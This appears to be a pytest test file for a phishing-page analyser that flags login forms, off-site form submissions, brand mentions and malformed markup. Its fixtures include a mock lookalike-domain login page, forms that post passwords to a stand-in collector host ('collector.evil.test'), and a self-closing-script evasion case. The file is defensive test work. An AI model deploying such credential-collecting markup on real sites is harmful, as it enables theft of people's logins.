"""
Tests for reading what a suspicious page is built to collect.

Every input here is attacker-authored markup, so alongside the detection cases
this file asserts the two properties that keep parsing safe: malformed input
never raises, and a hostile page cannot make parsing expensive.
"""

import pytest

from typo_sniper.page_analysis import MAX_FORMS, MAX_INPUTS, analyse, describe

PHISHING_PAGE = """
<html><head><title>Sign in to Example</title></head><body>
  <h1>Example Account Login</h1>
  <form action="/session" method="post">
    <input type="email" name="username" placeholder="Email address">
    <input type="password" name="password">
    <button type="submit">Sign in</button>
  </form>
</body></html>
"""

PARKED_PAGE = """
<html><head><title>example-shop.com</title></head><body>
  <h1>This domain is for sale</h1>
  <p>Contact the broker to make an offer.</p>
</body></html>
"""


class TestCredentialForms:
    def test_detects_a_login_form(self):
        result = analyse(PHISHING_PAGE, 'https://examp1e.com/', 'example.com')
        assert result['is_credential_form'] is True
        assert result['has_password_input'] is True
        assert result['has_username_input'] is True

    def test_a_parked_page_collects_nothing(self):
        result = analyse(PARKED_PAGE, 'https://examp1e.com/', 'example.com')
        assert result['is_credential_form'] is False
        assert result['has_password_input'] is False
        assert result['form_count'] == 0

    def test_a_search_box_alone_is_not_a_credential_form(self):
        """A form is not evidence of phishing; a form asking for a secret is."""
        page = '<form action="/s"><input type="text" name="q"></form>'
        result = analyse(page, 'https://examp1e.com/', 'example.com')
        assert result['form_count'] == 1
        assert result['is_credential_form'] is False

    def test_a_newsletter_signup_is_not_a_credential_form(self):
        page = '<form action="/sub"><input type="email" name="email"></form>'
        result = analyse(page, 'https://examp1e.com/', 'example.com')
        assert result['has_username_input'] is True
        assert result['has_password_input'] is False
        assert result['is_credential_form'] is False

    @pytest.mark.parametrize('field', [
        '<input type="password" name="p">',
        '<input type="text" name="passwd">',
        '<input type="text" name="user_pwd">',
        '<input type="text" id="login-secret">',
        '<input type="text" name="otp">',
        '<input type="text" name="mfa_code">',
        '<input type="text" autocomplete="current-password">',
        '<input type="text" name="card_number">',
        '<input type="text" name="cvv">',
    ])
    def test_credential_fields_hiding_as_text(self, field):
        """type=text is a one-character change; the name still gives it away."""
        page = f'<form><input type="email" name="u">{field}</form>'
        assert analyse(page, 'https://x.com/', '')['is_credential_form'] is True

    def test_select_and_textarea_are_counted(self):
        page = ('<form><input type="email" name="u">'
                '<textarea name="password_hint"></textarea></form>')
        assert analyse(page, 'https://x.com/', '')['has_password_input'] is True


class TestFormDestination:
    def test_a_form_posting_off_site_is_flagged(self):
        """A login page that submits elsewhere is an exfiltration path."""
        page = ('<form action="https://collector.evil.test/p" method="post">'
                '<input type="password" name="p"></form>')
        result = analyse(page, 'https://examp1e.com/login', 'example.com')
        assert result['external_form_action'] is True
        assert 'evil.test' in result['form_action_hosts']

    def test_a_relative_action_is_same_origin(self):
        page = '<form action="/login"><input type="password" name="p"></form>'
        result = analyse(page, 'https://examp1e.com/', 'example.com')
        assert result['external_form_action'] is False

    def test_an_absolute_action_to_the_same_site_is_not_flagged(self):
        page = ('<form action="https://examp1e.com/login">'
                '<input type="password" name="p"></form>')
        assert analyse(page, 'https://examp1e.com/', '')['external_form_action'] is False

    def test_a_subdomain_of_the_same_site_is_not_flagged(self):
        """login.examp1e.com and examp1e.com are the same operator."""
        page = ('<form action="https://login.examp1e.com/s">'
                '<input type="password" name="p"></form>')
        assert analyse(page, 'https://examp1e.com/', '')['external_form_action'] is False

    def test_no_action_attribute_is_not_flagged(self):
        page = '<form><input type="password" name="p"></form>'
        assert analyse(page, 'https://examp1e.com/', '')['external_form_action'] is False


class TestBrandMentions:
    def test_counts_visible_mentions(self):
        result = analyse(PHISHING_PAGE, 'https://examp1e.com/', 'example.com')
        assert result['brand_mentioned'] is True
        assert result['brand_mention_count'] >= 1

    def test_script_contents_do_not_count_as_visible_text(self):
        """Otherwise a tracking script naming the brand inflates the signal."""
        page = ('<html><body><script>var brand="example example example";</script>'
                '<p>Nothing here</p></body></html>')
        assert analyse(page, 'https://x.com/', 'example.com')['brand_mentioned'] is False

    def test_style_contents_are_ignored(self):
        page = '<style>.example { color: red }</style><p>hi</p>'
        assert analyse(page, 'https://x.com/', 'example.com')['brand_mentioned'] is False

    def test_very_short_brands_are_not_matched(self):
        """Two-letter brands would match almost any page."""
        result = analyse('<p>a page about things</p>', 'https://x.com/', 'ab.com')
        assert result['brand_mentioned'] is False

    def test_no_monitored_domain_means_no_mention_counting(self):
        assert analyse(PHISHING_PAGE, 'https://x.com/', '')['brand_mentioned'] is False


class TestRobustness:
    """Attacker-authored markup must never raise or stall."""

    @pytest.mark.parametrize('page', [
        '',
        '<',
        '<form',
        '<form><input type=password',
        '<<<>>>',
        '<html><body><p>unclosed',
        '<form action="::::not a url::::"><input type="password"></form>',
        '<input type="password" name="' + 'x' * 10_000 + '">',
        '\x00\x01\x02 binary garbage',
    ])
    def test_malformed_input_does_not_raise(self, page):
        result = analyse(page, 'https://x.com/', 'example.com')
        assert isinstance(result, dict)
        assert 'is_credential_form' in result

    def test_none_input(self):
        assert analyse(None, '', '')['parse_ok'] is False

    def test_form_collection_is_bounded(self):
        page = '<form action="/a"></form>' * (MAX_FORMS * 3)
        assert analyse(page, 'https://x.com/', '')['form_count'] <= MAX_FORMS

    def test_input_collection_is_bounded(self):
        """A page with a million inputs must not become a million dictionaries."""
        page = '<input type="text" name="a">' * (MAX_INPUTS * 3)
        result = analyse(page, 'https://x.com/', '')
        assert len(result['input_types']) <= 15

    def test_deeply_nested_markup(self):
        page = '<div>' * 5000 + 'text' + '</div>' * 5000
        assert analyse(page, 'https://x.com/', '')['parse_ok'] is True

    def test_form_action_hosts_are_bounded(self):
        page = ''.join(
            f'<form action="https://h{i}.test/x"><input type="password"></form>'
            for i in range(50)
        )
        assert len(analyse(page, 'https://x.com/', '')['form_action_hosts']) <= 5


class TestDescribe:
    def test_summarises_a_phishing_page(self):
        text = describe(analyse(PHISHING_PAGE, 'https://examp1e.com/', 'example.com'))
        assert 'credential form' in text
        assert 'names the brand' in text

    def test_names_the_exfiltration_host(self):
        page = ('<form action="https://collector.evil.test/p">'
                '<input type="email" name="u"><input type="password" name="p"></form>')
        text = describe(analyse(page, 'https://examp1e.com/', ''))
        assert 'submits off-site' in text
        assert 'evil.test' in text

    def test_a_parked_page_describes_as_nothing(self):
        assert describe(analyse(PARKED_PAGE, 'https://x.com/', 'example.com')) == ''

    def test_none_and_unparsed(self):
        assert describe(None) == ''
        assert describe({'parse_ok': False}) == ''


class TestSelfClosingTags:
    def test_self_closed_script_does_not_blank_later_text(self):
        """A single <script/> used to increment the suppression counter with
        no matching end tag, silencing every later brand mention — a
        one-character evasion of the whole text analysis."""
        from typo_sniper.page_analysis import analyse

        page = (
            '<html><head><script/></head><body>'
            '<p>Welcome to Example Corp</p>'
            '<form action="/login"><input type="text" name="user">'
            '<input type="password" name="pass"></form>'
            '</body></html>'
        )
        report = analyse(page, 'https://examp1e.com/', 'example.com')
        assert report['brand_mentioned'] is True
        assert report['is_credential_form'] is True

    def test_normal_script_content_is_still_suppressed(self):
        from typo_sniper.page_analysis import analyse

        page = (
            '<html><body><script>var x = "example brand text";</script>'
            '<p>plain page</p></body></html>'
        )
        report = analyse(page, 'https://examp1e.com/', 'example.com')
        assert report['brand_mentioned'] is False
